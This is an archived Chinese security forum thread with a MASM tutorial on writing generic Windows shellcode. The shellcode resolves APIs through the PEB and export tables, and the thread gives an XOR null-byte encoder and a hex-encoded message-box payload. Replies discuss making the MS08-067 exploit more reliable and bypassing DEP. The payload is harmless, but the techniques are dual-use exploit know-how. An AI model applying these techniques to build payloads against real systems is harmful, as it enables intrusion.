
# 汇编打造最简单的 shellcode

> 原文：[`www.pediy.com/kssd/pediy10/76204.html`](https://www.pediy.com/kssd/pediy10/76204.html)

最近看到了 MS08-67 的溢出漏洞的公布，看雪上也发布了一些利用工具。但测试的时候发现 telnet 链接总是链接不上，不知道是自己机器的毛病，还是其他的什么原因没有深究。发现原有的 shellcode 的运行很隐蔽。测试的时候很是麻烦，更本不知道溢出是否成功。就学着 failwest 大师的方法做了 MessageBOXA 的弹出框，由于地址硬编码很不爽。自己就动手做了一个通用的 Shellcode。实际上这样的代码四处都能找到。现在的高手们已经不屑于写这些东西了！多数人都在不断的优化，压缩自己的 shellcode。而在雪上也没有找到汇编制作的 Shellcode 的代码的教程，本人就借鉴其他众多的高手写的 SC 进行，分析改造做成属于自己的 shellcode 了。所以技术并非首创，只是研习！

再就是本人技术粗劣，见笑了！

\------------------------B.j.H's split-line-----------------------------------

shellcode 的流程大致是

1、根据 PEB 查找 kernel32.dll 的基地址
2、通过 kernel32 的基地址找到 LoadLibraryA 函数入口
3、加载 user32.dll 得到其基地址
4、根据 user32 的基地址得到 MessageBoxA 函数入口（弹出窗口）
5、根据 kernel32 的基地址获得 ExitProcess 的函数入口（安全退出程序）

\------------------------B.j.H's split-line-----------------------------------

代码:

```
;注意 masm 编译，注意这个程序不能直接运行，编译完成后 od 加载 code3 之前运行一次是加密，运行完 dump 出来就是 shellcode 了！
.386p
.model flat, stdcall
.code
start: 
assume fs:flat, gs:flat
;这里直接写代码

;------------------------B.j.H's split-line-----------------------------------
;首先建立一个在 shellcode 中需要用到的字符表他应该包括
;LoadLibraryA
;user32
;MessageBoxA
;ExitProcess
;B.J.H        当然为了弹出的 Msgbox 有个性可以添加这样一字符串，用来弹框框
;这些字符统统压入堆栈以便调用！
;所以我们代码的前面是
;------------------------B.j.H's split-line-----------------------------------
push 0048h                        ;B.J.H
push 2e4a2e42h                    ;
push 00737365h                    ;ExitProcess
push 636f7250h
push 74697845h
push 0041786fh                    ;MessageBoxA
push 42656761h
push 7373654dh
push 00323372h                    ;user32
push 65737500h
push 41797261h                    ;LoadLibraryA
push 7262694ch
push 64616f4ch
mov edx,esp                       ;保存字符串首地址
;上面是一个函数表！注意压入的字符格式，注意堆栈是倒过来的！慢慢调试可以感觉出来的！
最后一据代码是保存字符串表的的入口（也就是首地址）
;------------------------B.j.H's split-line-----------------------------------
;获得 Kernel 的基地址（这一段很多地方都能找到！）不做解释了！
xor eax,eax
mov eax,dword ptr FS:\[030h\]
mov eax,DWORD PTR \[eax+0ch\]
mov esi,DWORD PTR \[eax+01ch\]
lodsd
mov eax,dword ptr \[eax+8h\]
;------------------------B.j.H's split-line-----------------------------------
;现在 eax 中存放的就是 kernel32 的基地址了！
;当处到这里我就不知道该怎么出来了！得到基地址到底有什么用呢！不知道！呵呵！时间久了！
;忙忙的阅读一些资料！自然而然的就懂了！...我不是那种一看资料就明白的那种具有潜质的大
;鸟，只是一点一点体会的小菜鸟！
;下面先写一个调用就是
;------------------------B.j.H's split-line-----------------------------------
push eax                          ;保存 kernel32.dll 基地址
push edx                          ;传入需要查询函数名地址
push 0ch                          ;函数名长度
call getapi                       ;调用函数得到函数入口
;------------------------B.j.H's split-line-----------------------------------
pop ebx                           ;弹出堆栈里的的函数名地址（是之前建立的）
add ebx,0dh                    ; 加上字符长度得到下一个需要使用的字符串的
push ebx                         ;参数"user32"
call eax                           ;调用 LoadLibraryA("user32"),加载
                                       ;user32.dll，且 eax 中是从函数调用返回的 user32 的基地址
;------------------------B.j.H's split-line-----------------------------------
add ebx,07h                     ; 继续得到下一个需要使用的字符串。下面的几个调用不详细说了... ...
push ebx                          ; 
push 0bh                          ;  
call getapi                        ;调用 getaddr 函数获取 MessageBoxA 函数地址.
;------------------------B.j.H's split-line-----------------------------------
pop ebx                           ; 
add ebx,018h                   ; 
push 0h                           ; 
push ebx                          ;
push ebx                          ;
push 0h                           ;
call eax                          ;调用 MessageBoxA
;------------------------B.j.H's split-line-----------------------------------
mov edx,0ch                     ; 
pop eax                            ; 
sub ebx,edx                      ; 
push ebx                          ;
push edx                          ;
call getapi                        ;调用 getaddr 函数获取 exitprocess 函数地址.
call eax                            ;调用 exitprocess
;------------------------B.j.H's split-line-----------------------------------
;下面这个才是重点！（个人认为）
;写一个根据 dll 的基地址查找 API 函数入口 的函数方便调用
;函数说明：此函数包括两个传入参数，一个是基地址，另一个是需要查询的函数名字符串首地址
;------------------------B.j.H's split-line-----------------------------------
getapi：
mov ebx,eax                                  ;eax 存放的传入的基地址
add eax,03ch                                 ;定位 PE 头位置地址
mov eax,dword ptr \[eax\]               ;获得 PE 头偏移地址
add eax,ebx                                   ;计算 PE 头 VA
cmp dword ptr \[eax\],00004550h    ;验证 PE 文件的合法性
jne Err                                            ;不合法跳转
mov eax,dword ptr \[eax+078h\]     ;导出表地址获得
add eax,ebx                                  ;计算导出表入口 VA
push eax                                       ;保存导出表入口 VA
mov ecx,eax                                  ;令 ecx 指向导出表
mov ecx,dword ptr \[ecx + 014h\]   ;找出导出表中函数个数作为循环值
mov eax,dword ptr \[eax + 020h\]   ;找出函数名字符串地址表的偏移
add eax,ebx                                  ;计算函数名字符串地址表的 VA
push ebp                                        ;保存 ebp 寄存器，寄存器不够用，借用一下，呵呵！
mov ebp,eax                                  ;ebp 保存函数名字符串地址表的 VA
xor edx,edx                                   ;edx 清 0 用于存放函数索引

LoopFind:
push ecx;                                       ;保存 ecx 循环次数
mov eax,dword ptr\[eax\]                ;获取函数名字符串偏移
add eax,ebx                                  ;计算函数字符串 VA
mov edi,eax                                   ;把 VA 赋值给 edi 准备比较
mov esi,dword ptr \[esp + 014h\]   ;这个地方要算好了！函数内部有 3 个 push，每个 push 为 4 个字节一个 12 个字节
                                                      ;字符串地址放在 call 外部倒数第二个 push(这个自己用控制好第几个参数是自己定的)
               ;也就是说从 push 字符串地址到这个命令行之间有 16 个字节被 push 进入栈中。是不是就是+10H 呢
               ;注意我们这里用了一个函数，不是 jmp，函数调用的时候会有一个 push eip 用于返回！
               ;所以我们在计算的时候这个 push 不能忘，最后计算得到 esp+14h 中所放的就我们要查的函数名字符的地址
mov ecx,dword ptr \[esp + 010h\]     ; 计算同上，这里是给 ecx 赋值，函数名的长度。ecx 被改变了
                                                        ;（后面,在 loop 命令之前要恢复的 ecx，这个是计数器，硬性规定，呵呵！）
cld                              ;
repz cmpsb                                     ;字符串比较 esi 和 edi 比较
jne FindNext                                   ;比较,如果不是,则取下一个函数

add esp,4                                     ;找到往下执行 相当与 pop ecx。无关紧要了！
mov eax,dword ptr \[esp + 04h\]    ;恢复导出函数表入口
mov eax,dword ptr \[eax + 01ch\]   ;获得函数地址表入口偏移
                                                     ;我在这里缺少了一步，大多数情况不会有影响，具体的是哪一步，
                                                     ;深究的同志可以看看关于函数导出表的函数查询方式
add eax,ebx                      ;计算函数地址表入口 VA
shl edx,2                        ;函数索引\*函数地址(默认为 4 个字节) 鉴戒别人的，很妙的一招相当与乘以 4
add eax,edx                      ;函数地址表基址+(函数索引)
mov eax,dword ptr\[eax\]           ;获得函数入口地址偏移
add eax,ebx                      ;计算 VA
jmp Found

FindNext:
inc edx                                ;计数器加一
add ebp,4h                         ;函数名字符串地址表的 VA 指向下一个函数名地址
mov eax,ebp                       ; 函数名地址的 VA 赋值到 eax
pop ecx                              ;恢复 ecx 循环次数
loop LoopFind                     ;loop 继续循环查找

Err:
xor eax,eax                       ;没有找到，或者出错，eax 清理。

Found: 
pop ebp                              ;恢复 ebp
pop ecx                               ;不能再恢复 eax 了！弹到 ecx 好了！
ret 4                                    ; 返回 且 add esp 4 
                                           ;这个是因为我们调用完函数时需要利用之前我们自己建立函数名字符表。
end start

```

实际上 shellcode 的功能已经实现了！但是存在一些问题就是编译过后有很多 00h 字节这样我们的 shellcode 在被处理的时候如果是字符处理的话很可能会被空字符截断这样 shellcode 就不能很好的被使用

如 strcpy strlen 等这样的函数都会有真样的问题。所以我对他进行一些处理就是通常大家说的加密。加密实际上只是对 shellcode 空字符处理

编译后我得到了 EBh 大小的 shellcode

这段代码也特棒借鉴了！

代码:



# B.j.H's split-line

```
;------------------------B.j.H's split-line-----------------------------------
jmp  code4                         ;跳到此段代码的最后一行利用 call 获得 call 下一段代码的地址
code2:                             ;call 到这边继续执行
pop  ebx                           ;弹出地址，加密从这个地址向下开始
xor  ecx,ecx                       ;ecx 清零
mov  eax, 090909090h               ;eax 放入密钥，呵呵！
code1:
xor  dword ptr [ebx+ecx*4], eax    ;开始加密喽
inc  cx                            ;计数
cmp  cx, 03ah                      ;计数比较 ebh/4=03ah
jl   code1                         ;没有计算完继续计算
jmp  code3                         ;计算完直接跳到 shellcode 的功能码，这个是解密时候跳转用的呵呵！
code4:
call code2
code3:

```

;------------------------B.j.H's split-line-----------------------------------  

`EB145B33C9B89090909031048B416683F93A7CF6EB05E8E7FFFFFF` 这个是上面的加密代码  

;------------------------B.j.H's split-line-----------------------------------  

`FAD8F8D2BEDABEF8F5E3E390F8C0E2FFF3F8D5E8F9E4F8FFE8D190F8F1F7F5D2F8DDF5E3E3F8E2A3A290F890E5E3F5F8F1E2E9D1F8DCF9F2E2F8DCFFF1F41B44A350F431A09090901BD09C1BE08C3DD098C0C2FA9C78BF909090CB13539DC36F40135397C3FA9B788D909090CB135388FA90C3C3FA906F402A9C909090C84AC3C278929090906F401B481350AC1B90935311A8C0D59090E5D91BD0E89353C01B581BD9841BD0B09353C51B78A342C11B9093531B681BE4B4841BDCB4806C6336871354941BD4B4941BD08C935351729293521B9093537B9BD21355941B55C9725CA350CDC9C20400` 被加密的功能码 `messagbox` 的框(不确定这些代码被挖出来的时候是否正确，验证后等待确认)  

;------------------------B.j.H's split-line-----------------------------------  

感谢 `sylingyy` 指出错误...

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || 源码.rar |

引用: *最初由 **北极狐狸**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=531655#post531655) 最近看到了 MS08-67 的溢出漏洞的公布，看雪上也发布了一些利用工具。但测试的时候发现 telnet 链接总是链接不上，不知道是自己机器的毛病，还是其他的什么原因没有深究。发现原有的 shellcode 的运行很隐蔽。测试的时候很是麻烦，更本不知道溢出是否成功。就学着 failwest 大师的方法做了 Messa...

首先你加密代码也没有调用什么函数，怎么不用一些更通用的寄存器，例如 `edx`。

加密代码可以在优化下，为何不考虑从后往前开始 xor，这样就省了你的 `cmp` 判断了。

`code2:`  

    `jmp    code4`  
    `pop    edx`  
    `mov    eax, 090909090h`  
    `mov    ecx, $3a -1`  
  `@@:`    
    `xor    dword [edx+ecx*4], eax`  
    `loop                  @b`  
    `jmp    _start`  
  `code4:`  
    `call  code2`  
  `\_start:`  

                            ; `shellcode`  

下面的压入字符串应该考虑采用 `call` 的形式  

`call   @f`  

   `db  '',0`  

`@@:` 

引用: *最初由 **北极狐狸**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=531655#post531655) 最近看到了 MS08-67 的溢出漏洞的公布，看雪上也发布了一些利用工具。但测试的时候发现 telnet 链接总是链接不上，不知道是自己机器的毛病，还是其他的什么原因没有深究。发现原有的 shellcode 的运行很隐蔽。测试的时候很是麻烦，更本不知道溢出是否成功。

你测的哪个版本的 Exploit？这个漏洞，据我所知，目前 public 了的 Exploit 以 HDM 的为最佳，就是 metasploit 里的那个 `rb` 脚本。我不知道你所说的原有 shellcode 运行很隐蔽是指什么？一般就那么几个跳转指令，比如攻击 2003 的，你在那个 `jmp esp` 的地址上下断点，然后 `esp` 指向的指令流，就是 shellcode 了，只不过一般会编编码什么的，没有什么隐蔽的吧。溢出成功这个就更好判断了，你用的是 bindshell，那就在 victim 上查看相应的 bindport 是否 listen 中即可。远程连不上的原因太多，未能有效攻击是最大的可能。

楼主说的 shellcode 隐蔽剧猜测可能是指  

1.不能亲切地观察到 shellcode 被执行的过程吧  

  api 断下后,进去慢慢跟吧  

或者  

2.`shellcode` 前面编码函数流程没明白,`f8` 后 shellcode 执行完了，然后觉得隐蔽吧  

连不上的原因比较多,可能 exploit 没执行成功,可能执行成功了,window 防火墙开着,这时你可以试下换个反向连接的 shellcode 执行下.

另外我发现公布的 exploit 好几个版本(metasploit 除外没细看)都是  

`fun(".\\\\x\\..\\..\\xxxxxxxx...",buffer[],1000,L"",&q,1);`

这样执行 bug 函数时 如果 `L''"` 这一项为空字符串,会把`.\\\\x\\..\\..\\xxxxxxxx...` 连接到栈里的某个地址指向的内容后面,如果这个地址指的内容为空,那么可以顺利进行,如果不为空,就会失败,带有一定的随机性.

如果 `fun("\\\\x\\..\\..\\xxxxxxxx...",buffer[],1000,L".",&q,1);` 这样利用,则会吧 `L"."`后面加\\ 后接在`\\\\x\\..\\..\\xxxxxxxx...` 前面,可以保证顺利进行

在 metasploit 学会了饶过 dep 但不知道那样的地址对同一补丁的操作系统会不会很通用

引用: *最初由 **netwind**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=532210#post532210) 这样执行 bug 函数时 如果 `L''"` 这一项为空字符串,会把.\\\\x\\..\\..\\xxxxxxxx... 连接到栈里的某个地址指向的内容后面,如果这个地址指的内容为空,那么可以顺利进行,如果不为空,就会失败,带有一定的随机性.

这个你看错了吧。你看那个父函数的 F5 显示，你说的这个形参就是 prefix，代码是有判断的  

```
if ( NULL == prefix || !*prefix )
{
    wcscat(...);
}
wcscpy(...);
```

如果 `prefix` 是空串或空指针，就不拼接了，后面还有显式的 `wcscpy()`确保初始化局部变量。

引用: *最初由 **netwind**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=532210#post532210) 在 metasploit 学会了饶过 dep 但不知道那样的地址对同一补丁的操作系统会不会很通用

对确定了的 SP 及语言版本的，还是很通用的。

引用: *最初由 **netwind**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=532210#post532210) 如果 `fun("\\\\x\\..\\..\\xxxxxxxx...",buffer[],1000,L".",&q,1);` 这样利用,则会吧 `L"."`后面加\\ 后接在`\\\\x\\..\\..\\xxxxxxxx...` 前面,可以保证顺利进行

...

部分转自 LittleWallE 的博客[`blog.csdn.net/LittleWallE/arc...4/3772791.aspx`](http://blog.csdn.net/LittleWallE/archive/2009/01/14/3772791.aspx)

我想是像他说的这样吧。

在 windows2000 和 windows xp 中，`CanonPathName` 这个函数有一个另外的问题。可以简单把流程想象成这样:

```
CanonPathName(WCHAR *A, WCHAR B)
{
       WCHAR buffer[414];
       if(A!=0)
       {
              if(wcslen(A)!=0)
              {
                     wcscpy(buffer,A);
              }
       }else
       {
              buffer[0]=0;
       }
       wcscat(buffer,B);
    ……….
}
```

如果参数 `A` 不是 0，而是一个指向空字符串的指针，则该函数的作用就是直接将 `B` 连接到缓冲 `buffer` 上，而 `buffer` 是一片没有初始化的区域，从而造成后面的字符串出错。

相应的，如果以下面的方式调用函数 (第四个参数是空字符串)：

`NetpwPathCanonicalize("LittleWallE",(unsigned short *)buffer,(unsigned char *)arg2, arg3,**L""**,(long *)Buff3,1);`

则偶尔会利用不成功。

解决方法也很简单，将第四个参数设置为**`L"."`**即可.
